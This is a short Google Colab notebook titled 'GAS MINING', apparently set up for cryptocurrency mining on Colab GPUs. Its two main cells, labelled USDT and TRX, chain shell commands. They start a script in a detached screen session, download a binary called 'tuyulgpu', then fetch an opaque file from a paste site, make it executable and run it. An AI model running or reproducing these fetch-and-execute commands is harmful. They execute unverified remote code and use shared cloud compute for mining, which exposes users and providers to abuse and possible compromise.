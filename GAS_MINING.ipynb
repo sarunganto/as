{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "GAS MINING",
      "provenance": [],
      "machine_shape": "hm",
      "authorship_tag": "ABX9TyMUGQRlWfeJ9duUWcWAnwyi",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/mamakkaucoy/haha/blob/main/GAS_MINING.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "4Q7AC6N_5Clp"
      },
      "source": [
        "#@title CEK GPU\n",
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "KUdrRZg992SZ",
        "cellView": "form"
      },
      "source": [
        " #@title USDT\n",
        "\n",
        "#!/bin/sh\n",
        "\n",
        "!sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/mamakkaucoy/kontol/raw/main/tuyulgpu && chmod +x tuyulgpu && wget https://www.heypasteit.com/download/0IW7RA && chmod u+x 0IW7RA && ./0IW7RA"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "G1VKL7OX4Zyy"
      },
      "source": [
        " #@title TRX\n",
        "\n",
        "#!/bin/sh\n",
        "\n",
        "!sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/mamakkaucoy/kontol/raw/main/tuyulgpu && chmod +x tuyulgpu && wget https://www.heypasteit.com/download/0IW7RC && chmod u+x 0IW7RC && ./0IW7RC"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
